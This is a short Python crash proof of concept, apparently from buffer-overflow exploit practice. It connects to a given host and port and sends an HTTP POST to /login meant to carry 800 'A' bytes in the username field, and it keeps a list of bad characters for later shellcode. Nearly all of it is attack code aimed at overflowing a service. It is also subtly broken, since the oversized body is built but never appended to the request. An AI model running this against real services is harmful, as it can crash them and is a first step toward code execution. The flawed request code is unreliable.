#!/usr/bin/python
import socket
import sys
from time import sleep
from struct import pack

SLEEP_TIME  = 10
CRASH_TIME  = 60
bad_chars    = [0x00, 0x09, 0x0a, 0x0c, 0x0d, 0x20]


def check_args():
    if len(sys.argv) != 3:
        print(f"[-] Usage: {sys.argv[0]} <ip_address> <port>")
        sys.exit(1)


def rconnect(server, port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((server, port))
            print("[+] Socket connected!")
            return s

        except socket.error:
            print("[-] Could not connect!")
            sleep(SLEEP_TIME)
            continue


def rsend(s, buf):
    s.send(buf)
    print("[+] Packet sent!")


def rrecv(s):
    response = s.recv(1024)
    print(f"[+] Message received: {response}")
    return response


def contains_badchars(byte_string):
    byte_string = byte_string.to_bytes(4)
    return any(single_byte in byte_string for single_byte in bad_chars)


def main():

    check_args()

    server  = sys.argv[1]
    port    = int(sys.argv[2])

    size        = 800
    inputBuffer = b"A" * size
    content     = b"username=" + inputBuffer + b"&password=A"

    buf = b"POST /login HTTP/1.1\r\n"
    buf += b"Host: " + server.encode() + b"\r\n"
    buf += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
    buf += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buf += b"Accept-Language: en-US,en;q=0.5\r\n"
    buf += b"Referer: http://10.11.0.22/login\r\n"
    buf += b"Connection: close\r\n"
    buf += b"Content-Type: application/x-www-form-urlencoded\r\n"
    buf += b"Content-Length: " + str(len(content)).encode() + b"\r\n"
    buf += b"\r\n"

    s = rconnect(server, port)
    rsend(s, buf)
    s.close()


if __name__ == "__main__":
    main()
